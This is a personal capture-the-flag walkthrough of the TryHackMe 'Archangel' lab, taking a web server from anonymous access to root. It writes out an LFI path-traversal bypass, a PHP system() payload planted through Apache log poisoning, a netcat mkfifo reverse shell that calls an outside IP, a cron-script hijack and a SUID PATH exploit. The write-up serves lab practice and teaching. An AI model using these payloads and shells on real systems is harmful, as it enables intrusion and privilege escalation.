# Archangel

https://tryhackme.com/room/archangel

Simple enough room, though a bit longer than usual which was nice - required a few steps and different flags to get from anon to root. It had a couple of rick rolls for a few files though which I could do without. Eh.

1. nmap showed 22, and 80
2. on 80 was a site off some template, with enumeration finding nothing. however, the pages listed an email called `support@mafialive.thm` which was a hint for a subdomain; typically .thm is used for hidden subdomains on try hack me - though another, more obvious hint was that the first question of the room is 'what subdomain did you find' :D
3. going to this subdomain showed an empty page - enumeration found robots.txt and test.php, with the former also pointing to the latter
4. test.php had a link that used a ?view= parameter to load another php page; obvious php lfi vulnerability
5. going to `test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php` retrieved the test page content as base64, which when extracted showd the core logic / filter (one of the flags was also in the source):

    ```php
    if(isset($_GET["view"])){
          if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                  include $_GET['view'];
                }else{

        echo 'Sorry, Thats not allowed';
                }
    }
    ```

6. a bypass for the above is something like: `test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd`, which got me the password file
7. with all this, the next step is something like apache log poisoning (the server was apache), and the hint for the next step was 'poison'

At this point I actually got stuck - might have just been tired. For teh life of me, I could not find and retrieve the apache access log. i got the error log, but the error log would encode anything it got sent and so I couldn't use it for poisoning. not sure what the issue was - I eneded up just sleeping on it. next day, worked almost immediately so... either the room VM had loaded up wrong, or I made some stupid mistake somewhere - probably the latter. I suspect it might have required an exact set of those .././.. above, to get the right path, maybe.

8. this request got the access logs: `test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log`, which showed paths and importantly, user-agent.
9. i submitted a normal request with the user agent header set to `<?php echo 'test' ?>`, and confirmed when retrieving the logs i got 'test' in an entry.
10. using this i submitted a request with the user agent `<?php system($_GET[1]); ?>`, then confirmed that `test.php?1=ls&view=...` would get me the contents of the webdirectory
11. finally i used a url encoded version of `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.188.208 4444 >/tmp/f` to get a shell as www-data.
12. on the machine, user flag was in archangels' home directory. enumeration from here revealed, via `cat /etc/crontab` that the archangel user was running a script that was writable: `/opt/helloworld.sh`, every minute
13. i appended a second reverse shell binder like above to this, to port 4445 this time, and caught a shell as archangel.
14. this allowed me to open a folder named `secret` under the archangel home dir, for the second flag.
15. in here was a suid binary (running as root) called backup. I ran strings against it, finding it ran the command: `cp /home/user/archangel/myfiles/* /opt/backupfiles`
16. this looked like path exploitation, and it was; i ran `echo /bin/bash -p > cp`, `chmod +x cp`, `export PATH=/home/archangel/secret:$PATH`, then ran `./backup` to get a root shell.
